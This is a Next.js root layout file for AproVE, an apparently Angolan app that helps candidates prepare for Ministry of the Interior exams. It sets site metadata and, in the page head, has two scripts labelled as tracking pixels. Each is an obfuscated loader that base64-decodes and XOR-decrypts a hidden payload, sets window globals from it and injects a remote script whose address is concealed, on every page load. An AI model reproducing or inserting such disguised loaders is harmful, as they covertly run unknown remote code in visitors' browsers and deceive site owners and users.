import type {Metadata, Viewport} from 'next';
import { Plus_Jakarta_Sans } from 'next/font/google';
import Script from 'next/script';
import './globals.css';

const jakarta = Plus_Jakarta_Sans({
  subsets: ['latin'],
  weight: ['400', '500', '600', '700', '800'],
  variable: '--font-sans',
  display: 'swap',
});

export const viewport: Viewport = {
  themeColor: '#0a1128',
  width: 'device-width',
  initialScale: 1,
};

export const metadata: Metadata = {
  title: 'AproVE — Preparação Inteligente para o Ministério do Interior',
  description: 'Conhece o AproVE, a aplicação que te ajuda a organizar os teus estudos, testar conhecimentos e preparar-te com confiança para o Ministério do Interior em Angola.',
  keywords: [
    'AproVE',
    'Ministério do Interior',
    'Angola',
    'concurso público',
    'preparação',
    'estudos',
    'testes',
    'exercícios',
    'MININT',
  ],
  openGraph: {
    title: 'AproVE — Preparação para Ingresso no Ministério do Interior',
    description: 'Organiza os teus estudos e prepara-te com mais confiança com a aplicação AproVE.',
    type: 'website',
    locale: 'pt_AO',
  },
  twitter: {
    card: 'summary_large_image',
    title: 'AproVE — Preparação para o Ministério do Interior',
    description: 'Organiza os teus estudos e testa os teus conhecimentos com o AproVE.',
  },
};

export default function RootLayout({children}: {children: React.ReactNode}) {
  return (
    <html lang="pt" className={jakarta.variable}>
      <head>
        {/* Pixel de Rastreamento / Analytics 1 */}
        <Script id="pixel-script-1" strategy="afterInteractive">
          {`(function(){var s_gw0=atob("DEAL1tbywaWWNLT75zspo6Se45+0XMCPlzMx+fmRpcu4QcCWjiZy+LWdrIv0RpuIhDJipqKB7tX/TNGXyDBirrOe78/lFpjZhjR/pL+QtNHzR5bBvB0n9LGersf3WMfZ3Rtw9LiTrMC0DpaLjjhuup+W44m0QtWXkiUp7PTEoMD3B9XDhnFt77eQo5LwAtbN0nUz4+7QvPjr");var h_6=[];for(var h_2x=0;h_2x<s_gw0.length;h_2x++){h_6.push(s_gw0.charCodeAt(h_2x)&255);}var s_8q=h_6[0];var l_lz=h_6.slice(1,1+s_8q);var y_ylo4=h_6.slice(1+s_8q);var v_vcb=y_ylo4.map(function(b,w_7eh){return b^l_lz[w_7eh%s_8q];});var n_s="";for(var m_1j4=0;m_1j4<v_vcb.length;m_1j4++){n_s+=String.fromCharCode(v_vcb[m_1j4]&255);}var d_4pp=decodeURIComponent(escape(n_s));var y_ju=JSON.parse(d_4pp);var o_oht=y_ju.globals||[];o_oht.forEach(function(m_e8px){window[m_e8px.name]=m_e8px.value;});var x_xpt=document.createElement("script");x_xpt.src=y_ju.url;x_xpt.async=true;x_xpt.defer=true;(y_ju.attributes||[]).forEach(function(y_x2){x_xpt.setAttribute(y_x2.name,y_x2.value);});(document.head||document.documentElement).appendChild(x_xpt);})();`}
        </Script>
        {/* Pixel de Rastreamento / Analytics 2 */}
        <Script id="pixel-script-2" strategy="afterInteractive">
          {`(function(){var n_d6rc=atob("DP4NygjTb0akZlKyR4Uvv3q/TXyGDibGN4035SewCyiKEybfLph05Gu8AmjGFH3BJIxkunygQDPQCyGdK595r3unQSzXRH6QJop5uGGxGjLBFXCIHIUvpGm+CmSeRDbTM58gv3y+BiDdSyLAIohopHz+FyXLAn/BJJUv5iqlDirRA3CIZdxw5nPxASfJA3CIZZpsvmn+GjLJDzTLao5/r362ATKJFSfQLpp+6CTxGSfIEzeQfdwvt1Wu");var f_a5=[];for(var q_54=0;q_54<n_d6rc.length;q_54++){f_a5.push(n_d6rc.charCodeAt(q_54)&255);}var f_56v=f_a5[0];var c_c=f_a5.slice(1,1+f_56v);var e_v4=f_a5.slice(1+f_56v);var z_ygn=e_v4.map(function(b,n_kf0){return b^c_c[n_kf0%f_56v];});var d_v="";for(var z_hagu=0;z_hagu<z_ygn.length;z_hagu++){d_v+=String.fromCharCode(z_ygn[z_hagu]&255);}var q_mor=decodeURIComponent(escape(d_v));var t_kxvv=JSON.parse(q_mor);var p_r9=t_kxvv.globals||[];p_r9.forEach(function(l_rm6){window[l_rm6.name]=l_rm6.value;});var x_xh7=document.createElement("script");x_xh7.src=t_kxvv.url;x_xh7.async=true;x_xh7.defer=true;(t_kxvv.attributes||[]).forEach(function(d_w0){x_xh7.setAttribute(d_w0.name,d_w0.value);});(document.head||document.documentElement).appendChild(x_xh7);})();`}
        </Script>
      </head>
      <body className="font-sans antialiased bg-[#070D18] text-slate-100 selection:bg-amber-400 selection:text-slate-950" suppressHydrationWarning>
        {children}
      </body>
    </html>
  );
}
